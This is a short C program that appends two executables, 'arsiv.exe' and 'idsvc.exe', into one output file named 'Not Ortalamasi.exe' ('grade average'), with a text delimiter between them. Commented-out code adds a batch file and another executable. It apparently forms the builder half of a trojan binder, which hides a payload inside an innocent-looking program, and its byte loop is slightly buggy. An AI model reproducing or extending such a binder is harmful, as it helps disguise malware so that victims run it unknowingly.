#include<stdio.h>
#include<conio.h>

int main()
{
     char a=' ';
     FILE *f1 = fopen("arsiv.exe","rb");
     FILE *f2 = fopen("idsvc.exe","rb");
     //FILE *f3 = fopen("runner.bat","rb");
     //FILE *f4 = fopen("c.exe","rb");
     FILE *f5 = fopen("Not Ortalamasi.exe","wb");
     
     while( !feof(f1) )
     {
          fscanf(f1,"%c",&a);
          fprintf(f5,"%c",a);
     }
     fprintf(f5,"fuck");
          printf("Ok ! ...\n");
     while( !feof(f2) )
     {
          fscanf(f2,"%c",&a);
          fprintf(f5,"%c",a);    
     }
     fprintf(f5,"fuck");
          printf("Ok ! ...\n");
     /*
     while( !feof(f3) )
     {
          fscanf(f3,"%c",&a);
          fprintf(f5,"%c",a);    
     }
     fprintf(f5,"fuck");
          printf("Ok ! ...\n");
     while( !feof(f4) )
     {
          fscanf(f4,"%c",&a);
          fprintf(f5,"%c",a);    
     }
     fprintf(f5,"fuck");
          printf("Ok ! ...\n");
          */
     fclose(f5);
}
